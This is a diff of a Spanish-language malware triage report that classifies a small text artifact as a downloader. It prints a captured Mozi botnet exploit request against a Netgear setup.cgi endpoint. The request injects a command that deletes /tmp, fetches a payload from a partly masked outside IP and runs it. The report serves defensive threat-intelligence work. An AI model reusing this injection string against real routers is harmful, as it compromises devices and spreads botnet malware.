@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 175 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:05:52+00:00`
+- **Registrado:** `2026-08-09T20:05:52.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,10 +53,10 @@ GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://1
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 125.40.76.XXX | static_analysis |
 | url | hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
-| hash | 296d3e3f96e08c90c11baa425c2e4314e2d42286e5d84d32196a8390f91ab985 | static_analysis |
+| ip | 125.40.76.XXX | static_analysis |
 | command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://125.40.76.XXX:58691/Mozi.m+-O+/tmp/netgear | strings |
+| hash | 296d3e3f96e08c90c11baa425c2e4314e2d42286e5d84d32196a8390f91ab985 | static_analysis |
 
 ## 🔎 Triage
 
